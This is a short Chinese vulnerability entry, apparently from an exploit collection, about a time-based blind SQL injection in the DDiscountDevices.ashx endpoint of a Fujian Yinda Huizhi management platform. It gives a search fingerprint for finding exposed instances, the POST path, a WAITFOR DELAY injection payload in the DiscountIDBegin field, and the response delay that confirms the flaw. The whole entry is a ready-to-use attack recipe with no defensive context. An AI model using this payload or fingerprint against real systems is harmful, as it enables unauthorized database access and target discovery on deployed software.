# 福建银达汇智信息智慧综合管理平台DDiscountDevices.ashx存在SQL注入漏洞

福建银达汇智信息智慧综合管理平台 ｜ SQL注入 ｜ —
- **指纹**：`title="智慧综合管理平台登入"`
- **请求**：`POST /Module/SBXX/Controller/DDiscountDevices.ashx HTTP/1.1`

**Payload**
```
action=find&DiscountIDBegin=1;WAITFOR+DELAY+'0:0:5'--
```
- **响应特征**：200 响应时间>=5s